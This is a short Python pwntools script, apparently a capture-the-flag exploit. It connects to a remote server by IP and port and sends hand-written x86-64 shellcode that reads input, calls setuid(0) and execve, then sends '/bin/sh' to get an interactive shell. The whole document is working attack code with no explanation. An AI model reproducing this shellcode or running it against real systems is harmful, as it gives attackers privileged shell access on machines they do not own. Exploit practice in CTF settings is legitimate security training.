from pwn import *

io = remote("101.32.220.189", 31819)
shellcode = '''
push 0
pop rax

push 0
pop rdi

push rbp
pop rsi

push 8
pop rdx

syscall

push 105
pop rax

push 0
pop rdi

syscall

push rbp
pop rdi

push 0
push 0
push rsp
pop rsi

push 0
pop rdx

push 0x3b
pop rax

syscall'''
shellcode = b"\x6a\x00\x58\x6a\x00\x5f\x55\x5e\x6a\x08\x5a\x0f\x05\x6a\x69\x58\x6a\x00\x5f\x0f\x05\x55\x5f\x6a\x00\x6a\x00\x54\x5e\x6a\x00\x5a\x6a\x3b\x58\x0f\x05"

io.send(shellcode)
print(shellcode)
print(len(shellcode))
input()
io.sendline(b'/bin/sh\x00')
io.interactive()
